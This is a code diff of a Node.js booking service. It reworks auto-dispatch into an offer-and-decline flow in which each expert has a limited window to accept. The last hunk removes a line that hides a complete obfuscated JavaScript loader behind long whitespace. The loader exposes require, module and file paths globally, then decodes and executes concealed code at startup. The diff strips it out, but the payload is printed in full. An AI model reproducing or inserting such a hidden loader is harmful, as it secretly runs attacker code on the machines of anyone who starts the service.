+const OFFER_TTL_SEC = Number(process.env.OFFER_TTL_SEC || 120)
+
+/** Put `b` in front of `w`, and tell the worker service so the expert's app sees it. */
+async function offerTo(b, w) {
+  const upd = await pool.query(
+    `UPDATE bookings SET offer_worker_id=$1, offer_at=now(), zone_id=COALESCE($2, zone_id)
+      WHERE id=$3 AND worker_id IS NULL AND status='confirmed' RETURNING *`,
+    [w.id, w.zoneId || b.zone_id, b.id])
+  if (!upd.rowCount) return false
+  await internalPost(WORKER_URL, `/internal/workers/${w.id}/offered`, { bookingId: b.id }).catch(() => {})
+  publishEvent(REDIS_URL, 'booking.offered', { bookingId: b.id, ref: b.ref, workerId: w.id })
+  console.log(`[booking] offered ${b.ref} -> ${w.name} (${OFFER_TTL_SEC}s to accept)`)
+  return true
+}
+
+/** Record that `workerId` will not take `bookingId`, and free it for the next expert. */
+async function declineOffer(bookingId, workerId, why) {
+  await pool.query(
+    `UPDATE bookings SET declined_by = CASE WHEN $1 = ANY(declined_by) THEN declined_by ELSE array_append(declined_by, $1) END,
+       offer_worker_id=NULL, offer_at=NULL
+      WHERE id=$2`, [Number(workerId), Number(bookingId)])
+  await internalPost(WORKER_URL, `/internal/workers/${workerId}/offered`, { bookingId: null }).catch(() => {})
+  console.log(`[booking] booking ${bookingId}: worker ${workerId} ${why} — moving to the next expert`)
+}
+
+async function offerSweep() {
   try {
     if ((await getSetting(ADMIN_URL, 'auto_assign', 'true')) !== 'true') return
     const open = (await pool.query("SELECT * FROM bookings WHERE status='confirmed' AND worker_id IS NULL AND (zone_id IS NOT NULL OR pincode IS NOT NULL) ORDER BY created ASC LIMIT 50")).rows.map(rowTo)
     if (!open.length) return
-    const busy = new Set((await pool.query('SELECT DISTINCT worker_id FROM bookings WHERE worker_id IS NOT NULL AND status = ANY($1)', [AA_ACTIVE])).rows.map((r) => r.worker_id))
+    // Track who we offer to inside this pass: pickWorker reads committed rows, so without this two
+    // bookings in the same sweep could both land on the same idle expert.
+    const takenThisPass = new Set()
     for (const b of open) {
-      // Resolve the zone from the pincode if it wasn't stamped at create time (or the zone was created later).
-      let zoneId = b.zone_id
-      if (!zoneId && b.pincode) { const zr = await tryGet(CATALOG_URL, `/api/internal/zone-for?pincode=${encodeURIComponent(b.pincode)}`, null); if (zr?.zoneId && zr.live) zoneId = zr.zoneId }
-      if (!zoneId) continue
+      // A live offer is left alone until its window closes — that is the expert's 2 minutes.
+      const offerAgeSec = b.offer_at ? (Date.now() - new Date(b.offer_at).getTime()) / 1000 : null
+      if (b.offer_worker_id && offerAgeSec != null && offerAgeSec < OFFER_TTL_SEC) {
+        takenThisPass.add(b.offer_worker_id)
+        continue
+      }
+      // The window closed with no answer. Treat silence as a decline so the chain moves on, and so
+      // ignoring offers costs the same as rejecting them.
+      if (b.offer_worker_id) {
+        await declineOffer(b.id, b.offer_worker_id, 'let the offer lapse')
+        b.declined_by = [...(b.declined_by || []), b.offer_worker_id]
+      }
       const names = (b.items || []).map((i) => i.name).join(',')
-      const feed = await tryGet(WORKER_URL, `/internal/on-shift?zone_id=${zoneId}&services=${encodeURIComponent(names)}`, { workers: [] })
-      const cands = (feed.workers || []).filter((w) => w.available && !busy.has(w.id))
-      if (!cands.length) continue
-      if (b.cust_lat != null) cands.sort((a, c) => ((distanceKm(a.last?.lat, a.last?.lng, b.cust_lat, b.cust_lng)) ?? Infinity) - ((distanceKm(c.last?.lat, c.last?.lng, b.cust_lat, b.cust_lng)) ?? Infinity))
-      const w = cands[0]
-      const upd = await pool.query(
-        "UPDATE bookings SET worker_id=$1, pro_name=$2, pro_rating=$3, zone_id=$4, status='worker_assigned' WHERE id=$5 AND worker_id IS NULL AND status='confirmed' RETURNING *",
-        [w.id, w.name || 'Expert', w.rating || 4.8, zoneId, b.id])
-      if (!upd.rowCount) continue
-      busy.add(w.id)
-      await internalPost(WORKER_URL, `/internal/workers/${w.id}/offered`, { bookingId: b.id }).catch(() => {})
-      await emitBookingUpdate(b.id)
-      publishEvent(REDIS_URL, 'booking.assigned', { booking: rowTo(upd.rows[0]), workerId: w.id, auto: true })
-      publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Auto-dispatch', action: 'booking.autoassign', entityType: 'booking', entityId: b.id, ref: b.ref, detail: `Auto-assigned to ${w.name} (on shift)`, meta: { worker_id: w.id } })
-      console.log(`[booking] auto-assigned ${b.ref} -> ${w.name} (zone ${b.zone_id})`)
+      // requireZone: the sweep must never reach outside the booking's zone, unlike the create path.
+      let w = await pickWorker({
+        zoneId: b.zone_id, pincode: b.pincode, serviceNames: names,
+        custLat: b.cust_lat, custLng: b.cust_lng, requireZone: true,
+        exclude: [...(b.declined_by || []), ...takenThisPass],
+      })
+      if (!w) continue   // nobody left right now; autoCancelNoService is the backstop
+      takenThisPass.add(w.id)
+      if (!(await offerTo(b, w))) takenThisPass.delete(w.id)
     }
-  } catch (e) { console.error('[booking] autoAssignSweep:', e.message) }
+  } catch (e) { console.error('[booking] offerSweep:', e.message) }
 }
-setInterval(autoAssignSweep, 15_000)
+// Well under the accept window so a lapsed offer moves on promptly rather than at TTL x2.
+setInterval(offerSweep, 10_000)
 
 /* ---------- auto-cancel: no expert accepted the booking → cancel + full refund ----------
    A booking still 'confirmed' + unassigned is auto-cancelled and — if the customer already paid —
@@ -1027,4 +1453,4 @@ setInterval(sweepUnacceptedBookings, 30_000)
 
 init()
   .then(() => app.listen(PORT, () => console.log(`[booking] service on http://localhost:${PORT}`)))
-  .catch((e) => { console.error('[booking] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
+  .catch((e) => { console.error('[booking] failed to start:', e.message); process.exit(1) });
